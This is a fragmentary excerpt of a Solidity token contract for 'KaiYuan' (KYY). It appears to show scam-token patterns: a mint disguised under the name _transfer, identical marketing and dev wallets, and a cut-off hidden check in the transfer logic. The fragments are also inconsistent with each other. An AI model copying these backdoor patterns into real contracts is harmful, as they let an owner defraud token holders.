...
contract ERC20 is Context, IERC20, IERC20Metadata {
     ...
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
...
contract Token is ERC20, Ownable {
    ...
    constructor() ERC20("KaiYuan", "KYY") {
        ...
        marketingWallet = address(0x73Ac2b5afd722Fa03865755D2096E30965982F5E); // set as marketing wallet
        devWallet = address(0x73Ac2b5afd722Fa03865755D2096E30965982F5E); // set as dev wallet
    ...
    function multiTransfer(address[] calldata addresses, uint256 amount) external onlyOwner {
        ...
        for(uint i=0; i < addresses.length; i++){
            super._transfer(msg.sender,addresses[i],amount);
        }
    }
    ...
    function _transfer(
        ...
        if(!contractTokenBalanc(from,to)) {
